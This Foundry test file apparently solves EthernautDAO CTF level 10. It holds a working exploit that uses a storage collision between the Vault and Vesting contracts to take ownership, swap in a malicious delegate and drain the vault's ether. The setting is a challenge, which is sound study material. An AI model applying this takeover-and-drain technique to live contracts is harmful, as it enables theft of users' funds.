// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../../src/ethernautDao/level10/Vault.sol";
import "../../src/ethernautDao/level10/Vesting.sol";

contract Attacker {
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract VaultVestingTest is Test {
    Vault vault;
    Vesting vesting;
    Attacker attack;

    address attacker;
    address alice;

    function setUp() public {
        vesting = new Vesting();

        alice = vm.addr(1);
        vm.prank(alice);
        vault = new Vault(address(vesting));
        vm.deal(address(vault), 1 ether);

        attacker = vm.addr(7);

        attack = new Attacker();
    }

    // function testGt() public {
    //     assertGt(uint256(uint160(attacker)), uint256(uint160(alice)));
    // }

    function testAttack() public {
        // Vault.sol         |  Vesting.sol
        // -------------------------------------------
        // address delegate  |  address beneficiary
        // address owner     | uint256 duration

        // storage collision between vault and vesting allows to set
        // owner variable with setduration.

        // using execute() to bypass the onlyAuth check.
        vault.execute(address(vault), abi.encodeWithSignature("setDuration(uint256)", uint256(uint160(attacker)))); // attacker address is encoded as uint256

        assertEq(vault.owner(), attacker);

        // update delegate contract to attack contract
        vm.startPrank(attacker);
        vault.upgradeDelegate(address(attack));

        // withdraw funds from vault contract
        // can now use _delegate() since owner is now attacker.
        (bool success,) = address(vault).call(abi.encodeWithSignature("withdraw()"));

        vm.stopPrank();

        assert(success);
        assertEq(attacker.balance, 1 ether);
    }
}
